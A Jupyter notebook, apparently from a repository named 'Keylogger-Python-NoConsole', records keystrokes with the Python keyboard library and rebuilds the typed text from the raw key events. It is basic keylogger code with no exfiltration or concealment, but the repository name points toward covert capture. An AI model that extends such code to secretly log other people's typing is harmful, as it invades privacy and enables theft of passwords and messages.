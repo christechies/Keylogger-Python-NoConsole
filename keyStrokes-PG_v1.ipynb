{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import keyboard"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [],
   "source": [
    "listen = keyboard.record(until='esc')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "KeyboardEvent(ctrl up)\n",
      "KeyboardEvent(right shift down)\n",
      "KeyboardEvent(S down)\n",
      "KeyboardEvent(right shift up)\n",
      "KeyboardEvent(s up)\n",
      "KeyboardEvent(h down)\n",
      "KeyboardEvent(h up)\n",
      "KeyboardEvent(e down)\n",
      "KeyboardEvent(e up)\n",
      "KeyboardEvent(l down)\n",
      "KeyboardEvent(l up)\n",
      "KeyboardEvent(d down)\n",
      "KeyboardEvent(d up)\n",
      "KeyboardEvent(o down)\n",
      "KeyboardEvent(n down)\n",
      "KeyboardEvent(o up)\n",
      "KeyboardEvent(n up)\n",
      "KeyboardEvent(space down)\n",
      "KeyboardEvent(space up)\n",
      "KeyboardEvent(right shift down)\n",
      "KeyboardEvent(C down)\n",
      "KeyboardEvent(right shift up)\n",
      "KeyboardEvent(c up)\n",
      "KeyboardEvent(o down)\n",
      "KeyboardEvent(o up)\n",
      "KeyboardEvent(p down)\n",
      "KeyboardEvent(p up)\n",
      "KeyboardEvent(e down)\n",
      "KeyboardEvent(e up)\n",
      "KeyboardEvent(backspace down)\n",
      "KeyboardEvent(backspace up)\n",
      "KeyboardEvent(backspace down)\n",
      "KeyboardEvent(backspace up)\n",
      "KeyboardEvent(o down)\n",
      "KeyboardEvent(o up)\n",
      "KeyboardEvent(p down)\n",
      "KeyboardEvent(p up)\n",
      "KeyboardEvent(e down)\n",
      "KeyboardEvent(e up)\n",
      "KeyboardEvent(r down)\n",
      "KeyboardEvent(r up)\n",
      "KeyboardEvent(' down)\n",
      "KeyboardEvent(' up)\n",
      "KeyboardEvent(space down)\n",
      "KeyboardEvent(space up)\n",
      "KeyboardEvent(s down)\n",
      "KeyboardEvent(s up)\n",
      "KeyboardEvent(esc down)\n"
     ]
    }
   ],
   "source": [
    "for y in listen:\n",
    "    print(y)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [],
   "source": [
    "def translate(listen):\n",
    "    data = []\n",
    "    for i in listen:\n",
    "        stroke = str(i)\n",
    "        beg = stroke.index('(')\n",
    "        end = stroke.index(' ')\n",
    "        end2 = stroke.index(')')\n",
    "        if stroke[end:end2].strip() == 'down':\n",
    "            if stroke[beg+1:end].strip() in ['ctrl','alt','up','down','left','right']:\n",
    "                continue\n",
    "            if stroke[beg+1:end].strip() in ['enter', 'tab']:\n",
    "                data.append('\\n')\n",
    "                continue\n",
    "            if stroke[beg+1:end].strip() in ['space','esc']:\n",
    "                data.append(' ')\n",
    "                continue\n",
    "            if stroke[beg+1:end].strip() == 'backspace':\n",
    "                data.pop()\n",
    "                continue\n",
    "            data.append(stroke[beg+1:end].strip())\n",
    "        else:\n",
    "            continue\n",
    "        translated = ''\n",
    "        for i in data:\n",
    "            translated += i\n",
    "    return translated"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"Sheldon Cooper' s\""
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "translate(listen)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "KeyboardEvent(enter up)\n",
      "KeyboardEvent(ctrl up)\n",
      "KeyboardEvent(h down)\n",
      "KeyboardEvent(h up)\n",
      "KeyboardEvent(e down)\n",
      "KeyboardEvent(e up)\n",
      "KeyboardEvent(l down)\n",
      "KeyboardEvent(l up)\n",
      "KeyboardEvent(l down)\n",
      "KeyboardEvent(l up)\n",
      "KeyboardEvent(o down)\n",
      "KeyboardEvent(o up)\n",
      "KeyboardEvent(space down)\n",
      "KeyboardEvent(space up)\n",
      "KeyboardEvent(t down)\n",
      "KeyboardEvent(t up)\n",
      "KeyboardEvent(h down)\n",
      "KeyboardEvent(h up)\n",
      "KeyboardEvent(e down)\n",
      "KeyboardEvent(e up)\n",
      "KeyboardEvent(r down)\n",
      "KeyboardEvent(e down)\n",
      "KeyboardEvent(r up)\n",
      "KeyboardEvent(space down)\n",
      "KeyboardEvent(e up)\n",
      "KeyboardEvent(space up)\n",
      "KeyboardEvent(f down)\n",
      "KeyboardEvent(f up)\n",
      "KeyboardEvent(i down)\n",
      "KeyboardEvent(i up)\n",
      "KeyboardEvent(r down)\n",
      "KeyboardEvent(r up)\n",
      "KeyboardEvent(backspace down)\n",
      "KeyboardEvent(backspace up)\n",
      "KeyboardEvent(backspace down)\n",
      "KeyboardEvent(r down)\n",
      "KeyboardEvent(backspace up)\n",
      "KeyboardEvent(r up)\n",
      "KeyboardEvent(i down)\n",
      "KeyboardEvent(i up)\n",
      "KeyboardEvent(e down)\n",
      "KeyboardEvent(e up)\n",
      "KeyboardEvent(n down)\n",
      "KeyboardEvent(n up)\n",
      "KeyboardEvent(d down)\n",
      "KeyboardEvent(d up)\n",
      "KeyboardEvent(esc down)\n"
     ]
    }
   ],
   "source": [
    "for i in listen:\n",
    "    print(i)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
